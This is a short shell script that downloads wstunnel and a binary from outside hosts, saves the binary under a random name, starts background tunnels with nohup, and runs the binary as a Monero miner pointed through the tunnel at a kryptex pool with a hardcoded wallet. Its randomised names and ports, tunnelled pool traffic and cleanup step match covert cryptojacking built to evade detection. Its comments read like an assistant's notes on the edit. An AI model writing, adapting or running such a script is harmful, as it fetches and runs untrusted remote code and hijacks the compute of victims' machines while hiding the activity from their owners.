# Generate random port between 1024 and 65535
RANDOM_PORT=$(shuf -i 1024-65535 -n 1)

# Generate random binary name (e.g., bos_8a7b9c)

BOS_DL=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 10)
# Download wstunnel and the random binary
curl -L -O -J https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
curl -s -L -o "${BOS_DL}" https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
# Extract and make executable
tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
chmod +x wstunnel "${BOS_DL}"

# Start wstunnel server on localhost (fixed or random local listen, here we keep the local server on a fixed or random local port, 
# but the user usually wants the *remote* tunnel port to be random or the *local* listening port. 
# Based on context, usually you want the local port (23768) to be random so you don't conflict, 
# OR you want the wstunnel server to bind to a random port. 
# Let's randomize the LOCAL listening port (23768) as that is the one exposed to the binary.
# If you meant randomize the SERVER port (21547), change the variable below.
# Here we randomize the LOCAL port that the mining binary connects TO.

LOCAL_TUNNEL_PORT=${RANDOM_PORT}

# Start wstunnel server (you might want this on a fixed port or random too, let's keep server fixed for stability or random it too)
# Let's randomize the WSTUNNEL SERVER port too for maximum randomness
WS_SERVER_PORT=$(shuf -i 1024-65535 -n 1)

nohup ./wstunnel server ws://127.0.0.1:${WS_SERVER_PORT} &

# Start client listening on the random LOCAL port
nohup ./wstunnel client -L tcp://127.0.0.1:${LOCAL_TUNNEL_PORT}:xmr.kryptex.network:7029 ws://127.0.0.1:${WS_SERVER_PORT} &

# Run the binary against the random local port
./"${BOS_DL}" -o 127.0.0.1:${LOCAL_TUNNEL_PORT} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT -t 6

# Clean up tarball
rm -f wstunnel_10.5.2_linux_amd64.tar.gz
